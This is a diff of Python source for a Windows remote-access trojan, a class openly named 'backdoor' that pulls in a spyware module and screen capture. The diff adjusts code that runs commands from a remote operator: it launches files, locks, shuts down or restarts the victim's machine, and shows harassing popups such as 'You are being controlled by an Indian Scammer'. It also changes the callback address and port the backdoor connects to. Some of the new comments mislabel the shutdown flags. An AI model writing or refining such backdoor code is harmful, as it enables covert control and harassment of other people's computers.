@@ -14,19 +14,19 @@ from PIL import ImageGrab
 from shutil import copyfile
 
 class backdoor:
-    PATH = os.path.realpath(sys.argv[0])
-    TMP = os.environ["TEMP"]
-    APPDATA = os.environ["APPDATA"]
-    UPLOADING_SFX_PATH = TMP + "\Music.wav"    
-
-    tm_enabled = True
-
     try:
         work_manager = wm.manager()
         current_username = spyware.spyware.current_user = os.getlogin()     #Static Variables
         
         hacked_msg_list = ["Brace yourself as pain is crawling towards you.", "{}, You are being controlled by an Indian Scammer!.".format(current_username)]
         troll_msg_list = ["Wake up {}...".format(current_username), "The Matrix has you... ", "Follow the white rabbit.", "Knock, Knock, {}.".format(current_username)]
+        
+        PATH = os.path.realpath(sys.argv[0])
+        TMP = os.environ["TEMP"]
+        APPDATA = os.environ["APPDATA"]
+        UPLOADING_SFX_PATH = TMP + "\Music.wav"    
+
+        tm_enabled = True
     except Exception:
         pass
 
@@ -202,7 +202,10 @@ class backdoor:
     def troll_user(self, msg_list, wait_time):
         for i in range(len(msg_list)):
             self.show_message_box_popup(msg_list[i])
-            time.sleep(wait_time)
+            if i == len(msg_list) - 1:
+                time.sleep(wait_time / 2)
+            else:
+                time.sleep(wait_time)
 
         self.work_manager.play_sound(self.UPLOADING_SFX_PATH, False)
 
@@ -296,26 +299,26 @@ class backdoor:
                         command_0 = self.work_manager.launch_file(rest_of_command)
                     elif command_0 == "cgstate":    #Change state of computer(lock, shutdown)
                         if rest_of_command == "1":
-                            command_result = self.lock_system()
+                            command_result = self.lock_system()     #Lock the system
                         elif rest_of_command == "2":
-                            command_result = self.shutdown_system("-s")
+                            command_result = self.shutdown_system("-s")     #Restart
                         elif rest_of_command == "3":
-                            command_result = self.shutdown_system("-r")
+                            command_result = self.shutdown_system("-r")     #Shut down
                         else:
                             command_result = "[-] (Client) No such parameter for cgstate."
-                    elif command_0 == "troll":
+                    elif command_0 == "troll":      #Troll the user
                         if rest_of_command_as_list[0] != "1" and rest_of_command_as_list[0] != "2":
                             command_result = "[-] (Client) No such parameter for troll."
                         else:
                             if rest_of_command_as_list[0] == "1":
                                 self.write_file(self.UPLOADING_SFX_PATH, rest_of_command_as_list[-1])
-                                command_result = self.troll_user(self.hacked_msg_list, 5)
-
+                               
+                                command_result = self.troll_user(self.hacked_msg_list, 5)                                
                                 self.work_manager.delete_path(self.UPLOADING_SFX_PATH)
                             elif rest_of_command_as_list[0] == "2":
                                 self.write_file(self.UPLOADING_SFX_PATH, rest_of_command_as_list[-1])
-                                command_result = self.troll_user(self.troll_user, 6)
-
+                                
+                                command_result = self.troll_user(self.troll_msg_list, 6)
                                 self.work_manager.delete_path(self.UPLOADING_SFX_PATH)
                     elif command_0 == "sdmsg":      #Send a message
                         command_result = self.show_message_box_popup(rest_of_command)
@@ -326,5 +329,5 @@ class backdoor:
 
             self.reliable_send(command_result)
 
-my_backdoor = backdoor("192.168.1.112", 4444)
+my_backdoor = backdoor("192.168.1.107", 4040)
 my_backdoor.run()
